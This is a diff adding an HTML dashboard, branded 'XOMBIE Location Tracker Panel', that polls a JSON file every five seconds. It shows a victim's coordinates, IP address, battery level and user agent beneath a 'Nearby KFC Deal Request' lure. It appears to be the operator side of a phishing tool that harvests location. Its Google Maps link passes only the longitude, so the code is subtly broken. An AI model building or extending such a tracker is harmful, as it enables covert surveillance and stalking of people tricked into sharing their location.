@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Location Panel - XOMBIE</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      padding: 20px;
+    }
+    h1 {
+      color: cyan;
+      text-align: center;
+    }
+    pre {
+      background: #111;
+      padding: 20px;
+      border: 1px solid lime;
+      border-radius: 10px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <h1>📡 XOMBIE Location Tracker Panel</h1>
+  <pre id="output">Fetching location data...</pre>
+
+  <script>
+    async function fetchData() {
+      try {
+        const res = await fetch('latest.json');
+        const data = await res.json();
+        document.getElementById('output').innerText = `
+🍗 Nearby KFC Deal Request
+📍 Latitude: ${data.lat}
+📍 Longitude: ${data.lon}
+🎯 Accuracy: ${data.accuracy} meters
+🌐 IP Address: ${data.ip}
+🔋 Battery: ${data.battery}
+🧠 User Agent: ${data.ua}
+📍 Google Maps: https://www.google.com/maps?q=${data.lon}
+🔥 POWERED BY XOMBIE TOOLS ☣️💀⚠️
+        `;
+      } catch (e) {
+        document.getElementById('output').innerText = "No location data found.";
+      }
+    }
+
+    fetchData();
+    setInterval(fetchData, 5000); // Auto-refresh every 5 sec
+  </script>
+</body>
+</html>
